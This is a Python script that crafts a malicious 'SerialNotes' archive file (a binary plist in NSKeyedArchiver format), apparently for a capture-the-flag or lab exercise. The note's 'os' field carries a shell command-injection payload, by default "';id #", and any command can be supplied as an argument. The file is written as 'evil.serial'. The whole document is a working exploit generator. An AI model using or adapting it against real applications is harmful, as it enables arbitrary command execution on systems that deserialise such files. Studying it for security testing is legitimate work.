#!/usr/bin/env python3
"""Build a SerialNotes .serial file (NSKeyedArchiver binary plist) holding [SerialNotes.Note].

Usage: python3 make_serial.py [os_value] [output_file]
Default os_value: "';id #"   default output: evil.serial
"""
import plistlib
import sys
from plistlib import UID

os_value = sys.argv[1] if len(sys.argv) > 1 else "';id #"
out_file = sys.argv[2] if len(sys.argv) > 2 else "evil.serial"

note_fields = {
    "name": "test",
    "content": "hello",
    "last_updated": "2026-11-20",
    "os": os_value,
}

objects = ["$null"]


def add(obj):
    objects.append(obj)
    return UID(len(objects) - 1)


# Root array placeholder at index 1, Note placeholder at index 2
root = {}
root_uid = add(root)
note = {}
note_uid = add(note)

for key, value in note_fields.items():
    note[key] = add(value)

note["$class"] = add({
    "$classname": "SerialNotes.Note",
    "$classes": ["SerialNotes.Note", "NSObject"],
})

root["NS.objects"] = [note_uid]
root["$class"] = add({
    "$classname": "NSArray",
    "$classes": ["NSArray", "NSObject"],
})

archive = {
    "$archiver": "NSKeyedArchiver",
    "$version": 100000,
    "$top": {"root": root_uid},
    "$objects": objects,
}

with open(out_file, "wb") as f:
    plistlib.dump(archive, f, fmt=plistlib.FMT_BINARY)

print(f"wrote {out_file} with os = {os_value!r}")
